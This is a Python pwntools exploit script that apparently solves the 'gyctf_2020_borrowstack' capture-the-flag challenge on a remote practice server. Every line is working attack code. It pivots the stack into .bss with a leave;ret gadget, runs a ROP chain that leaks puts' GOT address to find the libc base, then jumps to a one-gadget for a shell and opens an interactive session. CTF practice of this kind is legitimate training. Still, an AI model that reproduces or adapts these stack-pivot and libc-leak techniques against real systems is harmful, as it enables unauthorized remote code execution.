from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./gyctf_2020_borrowstack"], env={"LD_PRELOAD": libc_path})
p = remote("node4.buuoj.cn", 29594)
pro = ELF("./gyctf_2020_borrowstack")


puts_p = pro.plt["puts"]
puts_g = pro.got["puts"]
# start = 0x0400530
# main = 0x040062E
read_buf = 0x0400680
leave_ret = 0x0400699 
bss = 0x0601080
pop_rdi_ret = 0x0400703


# pad should put in the bss high addr
# or rop chain will break the got table
pad = cyclic(0x60)+p64(bss+0xa0)+p64(leave_ret)
p.send(pad)
pad = cyclic(0xa0)+p64(bss)+p64(pop_rdi_ret)+p64(puts_g)+p64(puts_p)
pad += p64(read_buf)  # can't ret to main/start, because the func also break the got table
p.send(pad)

p.recvuntil("stack now!\n")
info = u64(p.recvuntil("\n", drop=True).ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
base = info-0x6f690
oneshot = base+0x4526a
system = base+0x45390
binsh = base+0x18cd57
print("system: ", hex(system))
print("binsh: ", hex(binsh))
print("oneshot: ", hex(oneshot))

# attack
# can't ret to libc, use oneshot
# pad = cyclic(0x8)+p64(pop_rdi_ret)+p64(binsh)+p64(system)
pad = cyclic(0x8)+p64(oneshot)
p.send(pad)

p.interactive()


